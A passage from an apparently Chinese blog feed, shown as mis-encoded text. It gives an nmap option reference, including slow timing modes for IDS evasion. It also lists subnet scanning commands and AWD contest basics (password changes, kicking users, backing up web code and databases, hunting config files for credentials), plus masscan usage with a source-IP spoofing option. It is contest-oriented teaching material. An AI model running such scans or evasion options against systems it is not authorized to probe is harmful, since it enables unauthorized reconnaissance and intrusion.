é»˜è®¤æ¢æµ‹æ‰«æï¼ˆæ¢æµ‹ç«¯å£ï¼šTCP 80ï¼Œ445&amp;ICMPï¼‰</p><p>-PS  &lt;portlist&gt;  tcpæ¢æµ‹æ‰«æ</p><p>-PE  ICMP Echo Request</p><p>-PP  ICMP Timestamp Request</p><p>-PM  ICMP Netmask Request</p><h4 id="æ‰«æç±»å‹"><a href="#æ‰«æç±»å‹" class="headerlink" title="æ‰«æç±»å‹"></a>æ‰«æç±»å‹</h4><p>-sP  åªæ¢æµ‹ä¸»æœºåœ¨çº¿æƒ…å†µ</p><p>-sS  SYNæ‰«æï¼ˆéšèº«æ‰«æï¼‰</p><p>-ST  TCPæ‰«æ</p><p>-sU  UDPæ‰«æ</p><p>-sV  ç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹</p><p>-O   æ“ä½œç³»ç»Ÿè¯†åˆ«</p><p>â€“scanflags  æŒ‡å®šTCPæ ‡è¯†ä½ï¼ˆè®¾ç½®URG, ACK, PSH,RST,SYN,FINä½ï¼‰</p><h4 id="ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹"><a href="#ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹" class="headerlink" title="ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹"></a>ç»†ç²’åº¦çš„æ—¶é—´é€‰é¡¹</h4><p>â€“min-hostgroup/max-hostgroup <size>  å¹³è¡Œçš„ä¸»æœºæ‰«æç»„çš„å¤§å°</size></p><p>â€“min-parallelism/max-parallelism <numprobes>  å¹¶è¡Œæ¢æµ‹</numprobes></p><p>â€“min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   æŒ‡å®šæ¯è½®æ¢æµ‹çš„æ—¶é—´</time></p><p>â€“max-retries <tries>    æ‰«ææ¢æµ‹çš„ä¸Šé™æ¬¡æ•°è®¾å®š</tries></p><p>â€“host-timeout <time>    è®¾ç½®timeoutæ—¶é—´</time></p><p>â€“scan-delay/â€“max-scan-delay <time>  è°ƒæ•´ä¸¤æ¬¡æ¢æµ‹ä¹‹é—´çš„å»¶è¿Ÿ</time></p><p>â€“min-rate <number>     æ¯ç§’å‘é€æ•°æ®åŒ…ä¸å°‘äº<number>æ¬¡</number></number></p><h4 id="æ—¶åºé€‰é¡¹"><a href="#æ—¶åºé€‰é¡¹" class="headerlink" title="æ—¶åºé€‰é¡¹"></a>æ—¶åºé€‰é¡¹</h4><p>-T0  åæ‰§çš„ï¼šéå¸¸éå¸¸æ…¢ï¼Œç”¨äºIDSé€ƒé€¸</p><p>-T1  çŒ¥ççš„ï¼šç›¸å½“æ…¢ï¼Œç”¨äºIDSé€ƒé€¸</p><p>-T2  æœ‰ç¤¼è²Œçš„ï¼šé™ä½é€Ÿåº¦ä»¥æ¶ˆè€—æ›´å°çš„å¸¦å®½ï¼Œæ¯”é»˜è®¤æ…¢åå€</p><p>-T3  æ™®é€šçš„ï¼šé»˜è®¤ï¼Œæ ¹æ®ç›®æ ‡çš„ååº”è‡ªåŠ¨è°ƒæ•´æ—¶é—´æ¨¡å¼</p><p>-T4  é‡è›®çš„ï¼šå‡å®šå¤„åœ¨ä¸€ä¸ªå¾ˆå¥½çš„ç½‘ç»œç¯å¢ƒï¼Œè¯·æ±‚å¯èƒ½ä¼šæ·¹æ²¡ç›®æ ‡</p><p>-T5  ç–¯ç‹‚çš„ï¼šéå¸¸é‡è›®ï¼Œå¾ˆå¯èƒ½ä¼šæ·¹æ²¡ç›®æ ‡ç«¯å£æˆ–æ˜¯æ¼æ‰ä¸€äº›å¼€æ”¾ç«¯å£</p><h4 id="miscé€‰é¡¹"><a href="#miscé€‰é¡¹" class="headerlink" title="miscé€‰é¡¹"></a>miscé€‰é¡¹</h4><p>-n  ç¦æ­¢åå‘IPåœ°å€æŸ¥æ‰¾</p><p>-6  åªæ˜¯ç”¨ IPv6</p><p>-A  æ˜¯ç”¨å‡ ä¸ªå‘½ä»¤ï¼šOS æ¢æµ‹ï¼Œç‰ˆæœ¬æ¢æµ‹ï¼Œè„šæœ¬æ‰«æï¼Œtraceroute</p><p>â€“reason åˆ—å‡ºnmapçš„åˆ¤æ–­ï¼šç«¯å£å¼€æ”¾ï¼Œå…³é—­ï¼Œè¢«è¿‡æ»¤ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>-oN  æ ‡å‡†è¾“å‡º</p><p>-oG  å¥½ç†è§£çš„æ ¼å¼</p><p>-ox  xmlæ ¼å¼</p><p>-oA&lt;basename&gt;  ç”¨&lt;basename&gt;ç”Ÿæˆä»¥ä¸Šæ ¼å¼çš„æ–‡ä»¶ </p><h3 id="çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤"><a href="#çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤" class="headerlink" title="çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤"></a>çº¿ä¸‹AWDå¿…é¡»ç”¨å¥½çš„nmapæŒ‡ä»¤</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.9</span> ä½¿ç”¨nmapæ‰«æä¸»æœº</span><br><span class="line"><span class="comment">//  http://nmap.org/book/</span></span><br><span class="line">#nmap --version  <span class="comment">// -V -h</span></span><br><span class="line">#man nmap</span><br><span class="line"></span><br><span class="line">#nmap -vv -vvå‚æ•°è®¾ç½®å¯¹ç»“æœçš„è¯¦ç»†è¾“å‡º</span><br><span class="line">#nmap -sS -Pn -A hostéšèº«ã€æ“ä½œç³»ç»Ÿä¿¡æ¯å’Œè·¯ç”±è·Ÿè¸ªã€-P0å’Œ-Pnä¸¤ä¸ªé€‰é¡¹çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ä¸è¿›è¡Œä¸»æœºå‘ç°ï¼Œè€Œç›´æ¥è¿›è¡Œæ›´æ·±å±‚æ¬¡çš„æ‰«æï¼Œå¦‚æœåŠ¡ç‰ˆæœ¬æ‰«ææˆ–ç³»ç»Ÿç±»å‹æ‰«æã€‚-Pn  ä¸æ¢æµ‹æ‰«æï¼ˆå‡å®šæ‰€æœ‰ä¸»æœºéƒ½å­˜æ´»ï¼‰</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line"><span class="comment">// -A:to enable OS and version detection, script scanning,and traceroute;</span></span><br><span class="line"><span class="comment">// -T4:faster executionåŠ å¿«æ‰§è¡Œé€Ÿåº¦</span></span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line"><span class="comment">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span></span><br><span class="line"></span><br><span class="line">*å¤šæœºå¿«é€Ÿæ‰«æ</span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span>-sPæ˜¯ä½¿ç”¨ICMPåè®®å‘é€echoè¯·æ±‚æ•°æ®åŒ…ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“è¢«é˜²ç«å¢™è¿‡æ»¤æ‰ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;åœ¨çº¿ä¸»æœº</span></span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'report for.*[<span class="number">0</span><span class="number">-9</span>]$'</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;åœ¨çº¿ä¸»æœº:ç«¯å£å¼€æ”¾  -n ç¦æ­¢åå‘IPåœ°å€æŸ¥æ‰¾</span></span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p21ï¼Œ<span class="number">22</span>ï¼Œ<span class="number">80</span>ï¼Œ<span class="number">8080</span>ï¼Œ<span class="number">3306</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p1<span class="number">-1024</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">--max-rtt-timeoutè°ƒæ•´æ¢æµ‹æŠ¥æ–‡è¶…æ—¶</span><br><span class="line"></span><br><span class="line">&gt; results.txté‡å®šå‘å‘é€åˆ°æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="ç•ªå¤–AWD"><a href="#ç•ªå¤–AWD" class="headerlink" title="ç•ªå¤–AWD"></a>ç•ªå¤–AWD</h3><p>é™„ä¸ŠAWDåŸºæ“</p><h4 id="1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•"><a href="#1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•" class="headerlink" title="1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•"></a>1ã€ç¡®å®šç¯å¢ƒæ˜¯å¯†ç ç™»å½•è¿˜æ˜¯å¯†é’¥ç™»å½•</h4><p>å¯†é’¥ç™»å½•ï¼šï¼ˆæ¯”èµ›æ–¹ä¼šæä¾›å¦‚ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼‰</p><p>id_rsa</p><p>id_rsa.pub</p><p>token.txt</p><p>æ–‡ä»¶å¯¼å…¥å³å¯</p><p>è‹¥ä¸ºå¯†ç ç™»å½•ï¼Œåˆ™çœ‹å¯†ç æ˜¯å¦ä¸ºéšæœºçš„å“ˆå¸Œå€¼ï¼Œå¹¶æ¨æµ‹å…¨åœºå¯†ç æ˜¯å¦ä¸€æ ·ï¼Œè‹¥ä¸€æ ·åˆ™é¦–å…ˆéœ€è¦ä¿®æ”¹å¯†ç ï¼Œé¿å…å¯¹æ–¹å†™æ‰¹é‡éå†è„šæœ¬ï¼Œéå†æ‰€æœ‰æœåŠ¡å™¨ï¼Œå½“å¯ä»¥ç™»å½•æ—¶ï¼Œå°±ç¬é—´ä¿®æ”¹ä½ çš„æœºå­ï¼Œç„¶åä½ å°±ä»€ä¹ˆéƒ½åšä¸äº†ï¼ŒæœåŠ¡å™¨éƒ½è½åˆ°å¯¹æ–¹æ‰‹ä¸­ï¼Œé™¤éé‡ç½®æœºå­ã€‚</p><p>ä¿®æ”¹å¯†ç ï¼špasswd ç”¨æˆ·å    //linuxå‘½ä»¤</p><p>â€‹                    passwd ubuntu sudo passwd root   //ubuntuå‘½ä»¤ï¼š </p><p>â€‹                    w   //æŸ¥çœ‹å½“å‰ç™»å½•çš„ç”¨æˆ· </p><p>â€‹                    kill -kill -t ç”¨æˆ·çš„tty   //è¸¢æ‰å½“å‰ç™»å½•çš„ç”¨æˆ·</p><h4 id="2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº"><a href="#2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº" class="headerlink" title="2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº"></a>2ã€è¿…é€Ÿå¤‡ä»½æºç å’Œæ•°æ®åº“åˆ°æœ¬æœº</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/è¿™é‡Œå‡å®šwebç›®å½•ä¸º/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">å…¶ä¸­~ä»£è¡¨ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œ-ræ˜¯é€’å½’ï¼Œ-aæ˜¯ä¿ç•™åŸæ¥æ–‡ä»¶å±æ€§ï¼Œ .æ˜¯ä»£è¡¨æ‰€æœ‰æ–‡ä»¶ï¼ˆä¸ç”¨*ï¼Œå› ä¸º*æ— æ³•è¡¨ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼‰</span><br></pre></td></tr></table></figure><p>å®šæ—¶å¤‡ä»½æºç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //ä¸€åˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="3ã€æ‰¾é…ç½®æ–‡ä»¶-amp-mysqlä¸€äº›æ“ä½œ"><a href="#3ã€æ‰¾é…ç½®æ–‡ä»¶-amp-mysqlä¸€äº›æ“ä½œ" class="headerlink" title="3ã€æ‰¾é…ç½®æ–‡ä»¶&amp;mysqlä¸€äº›æ“ä½œ"></a>3ã€æ‰¾é…ç½®æ–‡ä»¶&amp;mysqlä¸€äº›æ“ä½œ</h4><p>æ‰¾é…ç½®æ–‡ä»¶ï¼Œæ‰¾æ–‡ä»¶åæœ‰conã€configã€dbå­—æ ·çš„ã€‚åœ¨åˆšæ‰å¤‡ä»½çš„æ–‡ä»¶é‚£é‡Œå¯ä»¥ä½¿ç”¨linuxå‘½ä»¤</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¿™äº›æ–‡ä»¶åï¼Œæœ€ä¸»è¦æ‰¾ä¸€äº›è´¦å·å¯†ç ï¼Œä¾‹å¦‚mysqlè´¦å·å¯†ç ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œè‡ªå·±å¯ä»¥ä¿®æ”¹è‡ªå·±æœåŠ¡å™¨ä¸Šçš„mysqlå¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼šï¼ˆå…ˆè‡ªå·±ç™»é™†è¿›å»ï¼‰</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("æ–°çš„å¯†ç ") where <span class="attribute">user</span>=<span class="string">'root'</span>; </span><br><span class="line">mysql&gt; flush privileges; (åˆ·æ–°)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure><p>è®°å¾—ä¿®æ”¹äº†mysqlå¯†ç åï¼Œè¿˜è¦æŠŠåˆšæ‰æ‰¾åˆ°çš„é…ç½®æ–‡ä»¶çš„å¯†ç ç»™ä¿®æ”¹äº†ï¼Œä¸ç„¶ä½ çš„webæœåŠ¡å°±ä¼šä¸æ­£å¸¸ã€‚</p><p>å¾—åˆ°mysqlå¯†ç ï¼Œä¸€èˆ¬æ¥è¯´ä½ å°±å¯ä»¥çœ‹çœ‹ä½ è‡ªå·±mysqlæ•°æ®åº“é‡Œçš„æ•°æ®ï¼Œä¸€èˆ¬æ¥è¯´åˆ«äººçš„æ•°æ®åº“è®°å½•ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ‰€ä»¥åˆ«äººä¸€äº›åå°è´¦å·å¯†ç ï¼Œä½ éƒ½å¯ä»¥æ‰¾åˆ°çš„ï¼ˆå¦‚æœé‡Œé¢å…¥åº“æ˜¯ä¸ç»è¿‡å“ˆå¸Œå¤„ç†çš„ï¼‰</p><p>å¦å¤–ï¼Œä¹Ÿå¤šæ³¨æ„æœ‰ä»€ä¹ˆåˆ«çš„é…ç½®æ–‡ä»¶ã€‚</p><p>å¤‡ä»½æ•°æ®åº“</p><p>â€‹        </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysqlå¤‡ä»½æŒ‡å®šæ•°æ®åº“ </span></span><br><span class="line">mysqldump -u ç”¨æˆ·å -<span class="selector-tag">p</span> å¯†ç  æ•°æ®åº“å &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysqlå¤‡ä»½æ‰€æœ‰æ•°æ®åº“ </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//è¿˜åŸmysqlæ•°æ®åº“ </span></span><br><span class="line">mysql -u ç”¨æˆ·å -<span class="selector-tag">p</span> å¯†ç  æ•°æ®åº“å &lt; bak.sql</span><br></pre></td></tr></table></figure><h4 id="4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰"><a href="#4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰" class="headerlink" title="4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰"></a>4ã€å—…æ¢ä¸»æœºï¼ˆnmapï¼‰</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMPæ‰«æï¼š nmap -sP <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">æ£€æµ‹ç›®æ ‡æ“ä½œç³»ç»Ÿï¼š -O</span><br><span class="line">SYNæ‰«æ  ï¼š -sS</span><br><span class="line">æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ£€æµ‹ï¼š -sV</span><br><span class="line">nmap -sS -p <span class="number">1337</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><h4 id="5ã€å—…æ¢ä¸»æœº-MASSCAN"><a href="#5ã€å—…æ¢ä¸»æœº-MASSCAN" class="headerlink" title="5ã€å—…æ¢ä¸»æœº(MASSCAN)"></a>5ã€å—…æ¢ä¸»æœº(MASSCAN)</h4><p><strong>å®‰è£…</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install clang git gcc make libpcap-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/robertdavidgraham/masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p><strong>å•ç«¯å£æ‰«æ</strong></p><p>æ‰«æ443ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p443</span><br></pre></td></tr></table></figure><p><strong>å¤šç«¯å£æ‰«æ</strong></p><p>æ‰«æ80æˆ–443ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p80,<span class="number">443</span></span><br></pre></td></tr></table></figure><p><strong>æ‰«æä¸€ç³»åˆ—ç«¯å£</strong></p><p>æ‰«æ22åˆ°25ç«¯å£çš„Bç±»å­ç½‘</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p22<span class="number">-25</span></span><br></pre></td></tr></table></figure><p><strong>å¿«é€Ÿæ‰«æ</strong></p><p>ä½¿ç”¨å¦‚ä¸Šçš„çš„è®¾ç½®å¯ä»¥å¾—åˆ°ç»“æœï¼Œä½†é€Ÿåº¦å°†æ˜¯æ¯”è¾ƒæ…¢ã€‚æ­£å¦‚å·²ç»è®¨è®ºçš„é‚£æ ·ï¼Œæ•´ä½“ä¸Šmasscanè¦å¿«ä¸€ç‚¹ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åŠ å¿«é€Ÿåº¦ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMasscanæ‰«æé€Ÿåº¦ä¸ºæ¯ç§’100ä¸ªæ•°æ®åŒ…ï¼Œè¿™æ˜¯ç›¸å½“æ…¢çš„ã€‚ä¸ºäº†å¢åŠ è¿™ä¸€ç‚¹ï¼Œåªéœ€æä¾›è¯¥-rateé€‰é¡¹å¹¶æŒ‡å®šä¸€ä¸ªå€¼ã€‚</p><p>æ‰«æ100ä¸ªå¸¸è§ç«¯å£çš„Bç±»å­ç½‘ï¼Œæ¯ç§’100,000ä¸ªæ•°æ®åŒ…</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> -rate <span class="number">100000</span></span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥æ‰«æçš„é€Ÿåº¦å–å†³äºå¾ˆå¤šå› ç´ ï¼ŒåŒ…æ‹¬æ‚¨çš„æ“ä½œç³»ç»Ÿï¼ˆLinuxæ‰«ææ‰«æè¿œè¿œå¿«äºWindowsï¼‰ï¼Œç³»ç»Ÿçš„èµ„æºï¼Œæœ€é‡è¦çš„æ˜¯æ‚¨çš„å¸¦å®½ã€‚ä¸ºäº†ä»¥é«˜é€Ÿæ‰«æéå¸¸å¤§çš„ç½‘ç»œï¼Œæ‚¨éœ€è¦ä½¿ç”¨ç™¾ä¸‡ä»¥ä¸Šçš„é€Ÿç‡ï¼ˆ-rate 1000000ï¼‰ã€‚</p><p><strong>æ’é™¤ç›®æ ‡</strong></p><p>å› ä¸ºå¤§éƒ¨åˆ†çš„äº’è”ç½‘å¯ä»¥å¾ˆå¥½åœ°è¿›è¡Œæ‰«æï¼Œä¹Ÿå¯èƒ½åªæ˜¯å‡ºäºçº¯ç²¹çš„ç¤¼è²Œ â€“ ä½ å¯èƒ½æƒ³è¦æˆ–éœ€è¦ä»æ‰«æä¸­æ’é™¤ä¸€äº›ç›®æ ‡ã€‚ä¸ºæ­¤ï¼Œè¯·æä¾›â€“excludefileäº¤æ¢æœºä»¥åŠåŒ…å«è¦é¿å…çš„èŒƒå›´åˆ—è¡¨çš„æ–‡ä»¶çš„åç§°ã€‚</p><p>æ‰«æBç±»å­ç½‘ï¼Œä½†é¿å…åœ¨exclude.txtä¸­çš„</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> --excludefile exclude.txt</span><br></pre></td></tr></table></figure><p><strong>ç»“æœä¿å­˜</strong></p><p>æ‚¨å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„Unixé‡å®šå‘å™¨å°†è¾“å‡ºå‘é€åˆ°æ–‡ä»¶ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> &gt; results.txt</span><br></pre></td></tr></table></figure><p> é™¤æ­¤ä¹‹å¤–ï¼Œæ‚¨è¿˜å…·æœ‰ä»¥ä¸‹è¾“å‡ºé€‰é¡¹ï¼š</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„XMLã€‚</span><br><span class="line">-oG <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„grepableæ ¼å¼ã€‚</span><br><span class="line">-oJ <span class="keyword">filename</span>ï¼šè¾“å‡ºåˆ°<span class="keyword">filename</span>çš„JSONæ ¼å¼ã€‚</span><br></pre></td></tr></table></figure><p><strong>NmapåŠŸèƒ½</strong></p><p>æ­£å¦‚æœ€åˆæåˆ°çš„ï¼ŒMasscanå¯ä»¥åƒnmapè®¸å¤šå®‰å…¨äººå‘˜ä¸€æ ·å·¥ä½œã€‚è¿™é‡Œæœ‰ä¸€äº›å…¶ä»–ç±»ä¼¼nmapçš„é€‰é¡¹ï¼š</p><p>é€šè¿‡ä¼ é€’â€“nmapå¼€å…³å¯ä»¥çœ‹åˆ°ç±»ä¼¼nmapçš„åŠŸèƒ½ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>-iL filenameï¼šä»æ–‡ä»¶è¯»å–è¾“å…¥ã€‚</span><br><span class="line"><span class="bullet">2. </span>â€â€exclude hostï¼šåœ¨å‘½ä»¤è¡Œä¸­æ’é™¤ç½‘ç»œã€‚</span><br><span class="line"><span class="bullet">3. </span>â€â€excludefile filenameï¼šä»æ–‡ä»¶ä¸­æ’é™¤ç½‘ç»œã€‚</span><br><span class="line"><span class="bullet">4. </span>-Sï¼šæ¬ºéª—æºIPã€‚</span><br><span class="line"><span class="bullet">5. </span>-v interfaceï¼šè¯¦ç»†è¾“å‡ºã€‚</span><br><span class="line"><span class="bullet">6. </span>-vv interfaceï¼šéå¸¸å†—é•¿çš„è¾“å‡ºã€‚</span><br><span class="line"><span class="bullet">7. </span>-e interfaceï¼šä½¿ç”¨æŒ‡å®šçš„æ¥å£ã€‚</span><br><span class="line"><span class="bullet">8. </span>-e interfaceï¼šä½¿ç”¨æŒ‡å®šçš„æ¥å£ã€‚</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><hr><p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p><p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python ä¹‹ æ­£åˆ™</title>
      <link href="/2019/07/21/python%20%E6%AD%A3%E5%88%99/"/>
      <url>/2019/07/21/python%20%E6%AD%A3%E5%88%99/</url>
      
